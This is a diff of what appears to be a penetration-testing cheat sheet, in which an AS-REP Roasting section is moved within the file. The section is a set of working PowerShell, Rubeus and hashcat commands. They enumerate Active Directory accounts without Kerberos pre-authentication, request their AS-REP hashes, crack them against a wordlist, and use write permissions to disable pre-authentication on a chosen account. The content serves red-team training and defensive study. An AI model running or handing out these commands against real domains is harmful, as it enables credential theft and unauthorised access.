@@ -134,6 +134,54 @@ Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’<ops/whatev
 
 #### Then Kerberoast user
 
+## AS-REP Roasting
+#### Enumerating accounts with kerberos preauth disabled
+```
+. .\Powerview_dev.ps1
+Get-DomainUser -PreauthNotRequired -Verbose
+```
+```
+Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
+```
+
+#### Request encrypted AS-REP
+```
+. ./ASREPRoast.ps1
+Get-ASREPHash -Username <username> -Verbose
+```
+
+#### Request encrypted AS-REP with rubeus
+```
+.\rubeus.exe asreproast /format:hashcat
+```
+
+#### Enumerate all users with kerberos preauth disabled and request a hash
+```
+Invoke-ASREPRoast -Verbose
+Invoke-ASREPRoast -Verbose | fl
+```
+
+#### Crack the hash with hashcat
+Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
+```
+Hashcat -a 0 -m 18200 hash.txt rockyou.txt
+```
+
+### Set pre-auth not required
+- With enough rights (GenericWrite of GenericAll) it is possible to set pre-auth not required.
+
+#### Enumerate permissions for group
+```
+Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
+Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
+```
+
+#### Set preauth not required
+```
+. ./PowerView_dev.ps1
+Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
 ## LAPS
 - On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.
 - Another great tool to use: https://github.com/leoloobeek/LAPSToolkit
@@ -197,54 +245,6 @@ Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samacc
 
 #LAPS Powershell cmdlet
 Get-AdmPwdPassword -ComputerName <MACHINE NAME>
-```
-
-## AS-REP Roasting
-#### Enumerating accounts with kerberos preauth disabled
-```
-. .\Powerview_dev.ps1
-Get-DomainUser -PreauthNotRequired -Verbose
-```
-```
-Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
-```
-
-#### Request encrypted AS-REP
-```
-. ./ASREPRoast.ps1
-Get-ASREPHash -Username <username> -Verbose
-```
-
-#### Request encrypted AS-REP with rubeus
-```
-.\rubeus.exe asreproast /format:hashcat
-```
-
-#### Enumerate all users with kerberos preauth disabled and request a hash
-```
-Invoke-ASREPRoast -Verbose
-Invoke-ASREPRoast -Verbose | fl
-```
-
-#### Crack the hash with hashcat
-Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
-```
-Hashcat -a 0 -m 18200 hash.txt rockyou.txt
-```
-
-### Set pre-auth not required
-- With enough rights (GenericWrite of GenericAll) it is possible to set pre-auth not required.
-
-#### Enumerate permissions for group
-```
-Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
-Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
-```
-
-#### Set preauth not required
-```
-. ./PowerView_dev.ps1
-Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
 ## Access Control List
